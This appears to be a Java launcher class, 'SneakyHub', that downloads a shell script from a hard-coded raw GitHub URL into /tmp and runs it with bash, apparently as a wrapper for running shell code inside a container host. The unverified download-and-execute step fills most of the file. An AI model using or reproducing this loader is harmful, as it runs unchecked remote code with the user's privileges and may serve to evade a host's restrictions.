import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;

public final class SneakyHub {
    private static final String SCRIPT_URL =
        "https://raw.githubusercontent.com/russel2138/test/main/witchly/start.sh";

    public static void main(String[] args) throws Exception {
        Path script = Path.of("/tmp/witchly-start.sh");

        System.out.println("[sneakyhub] Witchly launcher starting");
        System.out.println("[sneakyhub] Java: " + System.getProperty("java.version"));
        System.out.println("[sneakyhub] HOME: " + System.getenv().getOrDefault("HOME", "/home/container"));

        download(SCRIPT_URL, script);
        System.out.println("[sneakyhub] start.sh downloaded");

        Process process = new ProcessBuilder("bash", script.toString())
            .inheritIO()
            .start();

        int exit = process.waitFor();
        System.out.println("[sneakyhub] start.sh exited with code " + exit);
        System.exit(exit);
    }

    private static void download(String url, Path target) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setConnectTimeout(20_000);
        conn.setReadTimeout(60_000);
        conn.setInstanceFollowRedirects(true);
        conn.setRequestProperty("User-Agent", "sneakyhub-witchly/1");

        int code = conn.getResponseCode();
        if (code < 200 || code >= 300) {
            throw new IllegalStateException("HTTP " + code + " downloading " + url);
        }

        try (InputStream in = conn.getInputStream()) {
            Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
        } finally {
            conn.disconnect();
        }
    }
}
